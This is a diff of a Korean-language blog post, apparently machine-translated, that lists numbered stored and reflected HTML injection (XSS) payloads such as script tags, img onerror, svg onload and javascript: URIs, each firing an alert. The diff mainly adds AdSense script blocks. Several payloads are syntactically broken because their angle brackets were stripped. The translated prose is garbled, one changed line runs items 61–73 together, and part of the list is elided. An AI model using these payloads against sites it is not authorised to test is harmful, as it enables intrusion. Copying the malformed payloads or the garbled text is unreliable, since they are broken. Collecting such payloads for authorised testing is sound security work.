@@ -3,7 +3,7 @@ title: "HTML 삽입 (페이로드 목록)"
 description: ""
 coverImage: "/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"
 date: 2024-05-02 00:01
-ogImage: 
+ogImage:
   url: /assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png
 tag: Tech
 originalTitle: "HTML INJECTION (Payload List)"
@@ -11,27 +11,35 @@ link: "https://medium.com/@psychomong/html-injection-payload-list-735e69f522ca"
 isUpdated: true
 ---
 
-
-
-
 피신몽인 사람들, 다시 돌아
 
 주사, 이제 페이로드 목록을 가져 오는 것을 보여드리고, 검색 패널에서 시도해 볼 수 있으며, 그대로 반영될 수 있습니다 & 저장되면 위험할 수도 있습니다,
 
 이제 같은 것에 대해 몇 가지 기본 사항을 살펴보겠습니다. HTML 주입이 무엇인지 알아보기 위해
 아스타 타커
-HTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 드릴게요. 이것을 시도해서 혜택을 얻어보세요..... 
-
+HTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 드릴게요. 이것을 시도해서 혜택을 얻어보세요.....
 
 ![HTML INJECTION Payload List](/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png)
 
-<div class="content-ad"></div>
+<!-- seedividend - 사각형 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1898504329"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 페이로드 목록을 확인해 보세요...
 
 물론이죠! 저장된 및 반사된 HTML 주입 페이로드 100개를 모두 포함한 목록입니다:
 
 저장된 HTML 주입 페이로드:
+
 1. `script`alert(‘저장된 HTML 주입’)`/script`
 2. `img src="javascript:alert(‘저장된 HTML 주입’)"`
 3. `svg/onload=alert(‘저장된 HTML 주입’)`
@@ -91,27 +99,25 @@ HTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 �
 56. `body background="javascript:alert(‘저장된 HTML 주입’)"`
 57. `embed src="javascript:alert(‘저장된 HTML 주입’)"`
 58. `img src="javascript:alert(‘저장된 HTML 주입’)" onerror="alert(‘저장된 HTML 주입’)"`
-59. `body``svg``script`alert(‘저장된 HTML 주입’)`/script``/svg``/body`
+59. ` body``svg``script `alert(‘저장된 HTML 주입’)` /script``/svg``/body `
 60. `a href="data:text/html,`script`alert(‘저장된 HTML 주입’)`/script`"`여기를 클릭하세요`/a`
 
-<div class="content-ad"></div>
+<!-- seedividend - 사각형 -->
 
-반가워요! 
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1898504329"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
 
-다음은 HTML 주입 페이로드 결과입니다:
-61. `svg/onload=alert(‘주입된 HTML 삽입’)`
-62. `body onload=alert(‘주입된 HTML 삽입’)`
-63. `img src=x onerror=alert(‘주입된 HTML 삽입’)`
-64. `marquee onstart=alert(‘Reflected HTML Injection’)`
-65. `input type="image" src="javascript:alert(‘주입된 HTML 삽입’)"`
-66. `img src=1 href=1 onerror=alert(‘주입된 HTML 삽입’) /`
-67. `input type="hidden" onkeypress="alert(‘주입된 HTML 삽입’)"`
-68. `audio onloadstart="alert(‘주입된 HTML 삽입’)"`
-69. `form onsubmit="alert(‘주입된 HTML 삽입’)"`
-70. `textarea onchange="alert(‘주입된 HTML 삽입’)"`
-71. `base href="javascript:alert(‘주입된 HTML 삽입’)"`
-72. `a href="javascript:alert(‘주입된 HTML 삽입’)"`Click me`/a`
-73. `object data="javascript:alert(‘주입된 HTML 삽입’)"
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+반가워요!
+
+다음은 HTML 주입 페이로드 결과입니다: 61. `svg/onload=alert(‘주입된 HTML 삽입’)` 62. `body onload=alert(‘주입된 HTML 삽입’)` 63. `img src=x onerror=alert(‘주입된 HTML 삽입’)` 64. `marquee onstart=alert(‘Reflected HTML Injection’)` 65. `input type="image" src="javascript:alert(‘주입된 HTML 삽입’)"` 66. `img src=1 href=1 onerror=alert(‘주입된 HTML 삽입’) /` 67. `input type="hidden" onkeypress="alert(‘주입된 HTML 삽입’)"` 68. `audio onloadstart="alert(‘주입된 HTML 삽입’)"` 69. `form onsubmit="alert(‘주입된 HTML 삽입’)"` 70. `textarea onchange="alert(‘주입된 HTML 삽입’)"` 71. `base href="javascript:alert(‘주입된 HTML 삽입’)"` 72. `a href="javascript:alert(‘주입된 HTML 삽입’)"`Click me`/a` 73. `object data="javascript:alert(‘주입된 HTML 삽입’)"
 74. `img src="x" onmouseover="alert(‘주입된 HTML 삽입’)"`
 ... (중략)
 
@@ -119,6 +125,17 @@ HTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 �
 
 다음주 월요일에 만나요,
 
-<div class="content-ad"></div>
+<!-- seedividend - 사각형 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4877378276818686"
+     data-ad-slot="1898504329"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 행복한 해킹! 해커들...
